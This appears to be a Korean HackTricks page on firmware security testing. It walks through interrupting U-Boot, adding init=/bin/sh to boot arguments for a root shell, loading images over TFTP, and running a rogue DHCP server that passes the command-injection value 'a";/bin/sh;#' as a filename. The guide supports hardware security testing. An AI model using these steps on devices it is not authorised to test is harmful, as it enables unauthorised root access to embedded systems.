<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기교를 공유하세요.

</details>

다음은 U-boot와 같은 장치 시작 구성 및 부트로더를 수정하는 권장 단계입니다:

1. **부트로더의 인터프리터 셸에 액세스**:
- 부팅 중에 "0", 스페이스 또는 기타 식별된 "마법 코드"를 눌러 부트로더의 인터프리터 셸에 액세스합니다.

2. **부트 인수 수정**:
- 다음 명령을 실행하여 부트 인수에 '`init=/bin/sh`'를 추가하여 셸 명령을 실행할 수 있도록 합니다:
%%%
#printenv
#setenv bootargs=console=ttyS0,115200 mem=63M root=/dev/mtdblock3 mtdparts=sflash:<partitiionInfo> rootfstype=<fstype> hasEeprom=0 5srst=0 init=/bin/sh
#saveenv
#boot
%%%

3. **TFTP 서버 설정**:
- 로컬 네트워크를 통해 이미지를 로드하기 위해 TFTP 서버를 구성합니다:
%%%
#setenv ipaddr 192.168.2.2 #장치의 로컬 IP
#setenv serverip 192.168.2.1 #TFTP 서버 IP
#saveenv
#reset
#ping 192.168.2.1 #네트워크 액세스 확인
#tftp ${loadaddr} uImage-3.6.35 #loadaddr는 파일을 로드할 주소와 TFTP 서버의 이미지 파일 이름을 가져옵니다.
%%%

4. **`ubootwrite.py` 활용**:
- `ubootwrite.py`를 사용하여 U-boot 이미지를 작성하고 수정된 펌웨어를 푸시하여 루트 액세스를 얻습니다.

5. **디버그 기능 확인**:
- 디버그 기능(자세한 로깅, 임의의 커널 로드, 신뢰할 수 없는 소스에서 부팅 등)이 활성화되어 있는지 확인합니다.

6. **주의할 하드웨어 간섭**:
- 장치 부팅 순서 중에 커널이 압축 해제되기 전에 SPI 또는 NAND 플래시 칩과 상호 작용하면서 하나의 핀을 접지할 때 주의해야 합니다. 핀을 단락시키기 전에 NAND 플래시 칩의 데이터시트를 참조하세요.

7. **로그 DHCP 서버 구성**:
- PXE 부팅 중 장치가 흡수할 악성 매개변수로 로그 DHCP 서버를 설정합니다. Metasploit의 (MSF) DHCP 보조 서버와 같은 도구를 활용합니다. 'FILENAME' 매개변수를 `'a";/bin/sh;#'`와 같은 명령 주입 명령으로 수정하여 장치 시작 절차의 입력 유효성 검사를 테스트합니다.

**참고**: 장치 핀과의 물리적 상호 작용을 포함하는 단계(*별표로 표시됨)는 장치를 손상시키지 않기 위해 매우 주의해서 접근해야 합니다.


## 참고 자료
* [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기교를 공유하세요.

</details>
